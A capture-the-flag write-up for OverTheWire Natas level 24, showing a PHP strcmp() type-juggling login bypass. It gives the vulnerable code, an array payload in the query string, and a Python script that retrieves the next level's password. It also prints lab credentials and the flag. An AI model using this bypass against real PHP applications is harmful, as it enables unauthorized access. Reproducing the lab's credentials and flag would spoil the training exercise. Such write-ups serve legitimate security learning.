# Natas Level 24 Writeup (natas24) – OverTheWire

## Overview

This level focuses on exploiting a **PHP `strcmp()` type juggling vulnerability**.   
The goal is to find the password for the next level.

## Observation

When we open the page, we see an input field:

> **"Password:"**

There is also a link to view the source code:

```text
index-source.html
```

The source code contains:

```php
if(array_key_exists("passwd",$_REQUEST)){
    if(!strcmp($_REQUEST["passwd"],"<censored>")){
        echo "<br>The credentials for the next level are:<br>";
        echo "<pre>Username: natas25 Password: <censored></pre>";
    }
    else{
        echo "<br>Wrong!<br>";
    }
}
```

## Finding the Password

### Using Browser & BurpSuite

1. The application uses `strcmp()` to compare our input with the password.

2. We can send an array instead of a string by adding `[]` to the parameter:

   ```text
   passwd[]=test
   ```

3. Payload used:

   ```text
   ?passwd[]=test
   ```

4. `$_REQUEST["passwd"]` is now an array instead of a string.

5. This causes `strcmp()` to return `NULL`, and:

   ```php
   !NULL
   ```

   evaluates to `true`.

6. The application therefore displays the password for **natas25**.

#### Proof

```text
Username: natas25 
Password: UJEF5OAHF1eW3lqkpdCDM7ow4syzh4oo
```

### Using Python

```python
import requests, re

target = 'http://natas24.natas.labs.overthewire.org'
auth = ('natas24', 'shlL4BvOtawNCd81dwdKRHFzmTEjYYQX')

params = {
    'passwd[]': 'test'
}

r = requests.get(target, auth=auth, params=params)

match = re.search(r'Password:\s(\w{32})', r.text)
print("Password for next level is:", match.group(1))
```

## Vulnerability

The application expects `passwd` to be a string, but it does not check the input type.

By sending an array instead of a string, we can make `strcmp()` return `NULL`, causing the condition to evaluate as true.

## Flag

`UJEF5OAHF1eW3lqkpdCDM7ow4syzh4oo`
